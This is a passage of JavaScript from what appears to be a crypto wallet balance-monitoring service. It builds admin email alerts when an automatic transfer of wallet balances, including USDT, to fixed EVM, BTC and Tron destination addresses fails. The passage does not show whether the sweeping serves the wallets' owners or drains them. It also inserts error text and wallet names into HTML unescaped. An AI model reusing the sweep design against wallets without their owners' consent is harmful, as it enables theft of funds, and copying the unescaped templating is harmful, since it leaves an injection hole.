            <p style="margin: 5px 0 0 0; font-size: 16px;">${
              isGasFeeError
                ? "Insufficient Gas to Send USDT"
                : "Failed to Send Wallet Balances"
            }</p>
          </div>
          <div class="content">
            <div class="error-box">
              <h2 style="margin-top: 0; color: ${errorColor};">⚠️ ${errorType}</h2>
              <p><strong>Error Message:</strong> ${error.message}</p>
              <p><strong>Error Type:</strong> ${error.name || "Unknown"}</p>
              ${
                isGasFeeError
                  ? `
              <p style="margin-top: 15px; padding: 10px; background: #fff; border-radius: 5px;">
                <strong>⚠️ Issue:</strong> The wallet has USDT tokens but insufficient native coin (${
                  balanceDetails.find((b) => !b.isToken)?.symbol || "ETH/BNB"
                }) to pay for gas fees to transfer the USDT.
              </p>
              `
                  : ""
              }
            </div>
            <div style="background: #f9f9f9; padding: 20px; margin: 20px 0; border-radius: 8px;">
              <h3 style="margin-top: 0;">📊 Wallet Information</h3>
              <div class="info-grid">
                <div class="info-label">Wallet Name:</div>
                <div class="info-value"><strong>${
                  wallet.wallet_name || wallet.name || "N/A"
                }</strong></div>
                <div class="info-label">Wallet ID:</div>
                <div class="info-value"><code>${wallet.id}</code></div>
                <div class="info-label">Error Time:</div>
                <div class="info-value">${new Date().toLocaleString()}</div>
              </div>
            </div>
            ${
              balanceDetails && balanceDetails.length > 0
                ? `
            <div style="background: #f9f9f9; padding: 20px; margin: 20px 0; border-radius: 8px;">
              <h3 style="margin-top: 0;">💵 Wallet Balances</h3>
              <table class="balance-table">
                <thead>
                  <tr>
                    <th>Chain</th>
                    <th>Symbol</th>
                    <th>Balance</th>
                    <th>Value (USD)</th>
                  </tr>
                </thead>
                <tbody>
                  ${balanceDetails
                    .map(
                      (b) => `
                    <tr>
                      <td>${b.chain}</td>
                      <td><strong>${b.symbol}</strong></td>
                      <td>${b.balance.toFixed(8)}</td>
                      <td>$${b.valueUSD.toFixed(2)}</td>
                    </tr>
                  `
                    )
                    .join("")}
                </tbody>
              </table>
            </div>
            `
                : ""
            }
            <div style="background: #fff3cd; padding: 15px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #ffc107;">
              <h4 style="margin-top: 0; color: #856404;">ℹ️ Action Required</h4>
              <p style="margin: 0; color: #856404;">
                ${
                  isGasFeeError
                    ? "The wallet has USDT tokens but insufficient native coin for gas fees. Please add native coin (ETH/BNB) to the wallet to enable USDT transfer."
                    : "The automatic balance transfer failed. Please check the wallet manually and ensure there is sufficient native coin for gas fees."
                }
              </p>
            </div>
          </div>
        </div>
      </body>
      </html>
    `;

    const text = `
${isGasFeeError ? "⚠️ GAS FEE ERROR" : "❌ ERROR"}: ${
      isGasFeeError
        ? "Insufficient Gas to Send USDT"
        : "Failed to Send Wallet Balances"
    }
═══════════════════════════════════════════════════════════

${errorType}: ${error.message}
Error Type: ${error.name || "Unknown"}

${
  isGasFeeError
    ? `
⚠️  ISSUE:
The wallet has USDT tokens but insufficient native coin (${
        balanceDetails.find((b) => !b.isToken)?.symbol || "ETH/BNB"
      }) to pay for gas fees to transfer the USDT.
`
    : ""
}

📊 WALLET INFORMATION:
- Wallet Name: ${wallet.wallet_name || wallet.name || "N/A"}
- Wallet ID: ${wallet.id}
- Error Time: ${new Date().toLocaleString()}

${
  balanceDetails && balanceDetails.length > 0
    ? `
💵 WALLET BALANCES:
${balanceDetails
  .map(
    (b) =>
      `- ${b.chain} (${b.symbol}): ${b.balance.toFixed(
        8
      )} = $${b.valueUSD.toFixed(2)} USD`
  )
  .join("\n")}
`
    : ""
}

⚠️  ACTION REQUIRED:
${
  isGasFeeError
    ? "The wallet has USDT tokens but insufficient native coin for gas fees. Please add native coin (ETH/BNB) to the wallet to enable USDT transfer."
    : "The automatic balance transfer failed. Please check the wallet manually and ensure there is sufficient native coin for gas fees."
}

═══════════════════════════════════════════════════════════
Generated: ${new Date().toISOString()}
    `;

    return await notificationService.sendAdminEmail(subject, html, text);
  }

  /**
   * Get monitoring status
   */
  getStatus() {
    return {
      isRunning: this.isRunning,
      interval: this.updateInterval,
      thresholdUSD: this.thresholdUSD,
      evmDestination: this.evmDestination,
      btcDestination: this.btcDestination,
      tronDestination: this.tronDestination,
      lastCheck: this.lastCheck || null,
    };
  }
}

module.exports = new WalletBalanceMonitorService();
